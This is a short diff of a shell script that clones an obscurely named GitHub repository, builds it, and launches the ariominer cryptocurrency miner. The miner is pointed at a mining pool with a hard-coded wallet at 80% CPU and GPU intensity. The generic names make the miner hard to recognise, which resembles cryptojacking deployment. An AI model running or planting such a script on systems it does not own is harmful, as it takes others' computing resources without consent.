@@ -1,6 +1,6 @@
-git clone https://github.com/mobileapps84741274/linux8444
+git clone https://github.com/mobileapps84741274/linux8844
 
-cd ./linux8444/
+cd ./linux8844/
 
 mkdir ./build/
 
@@ -10,6 +10,6 @@ cmake ..
 
 make
 
-cd ./linux8444/
+cd ./linux8844/
 
-./linux84 linux84
+./ariominer --mode miner --pool http://aropool.com --wallet 3VnCmWyLQb8f1XhkQv4fiB1CrGewityDDteNtQwhMu3DjBuaDmUWbPMkPnbSaJPcbGrrJi1zkCHDXd4fGtTUeej3 --name linux84 --cpu-intensity 80 --gpu-intensity-cblocks 80 --gpu-intensity-gblocks 80
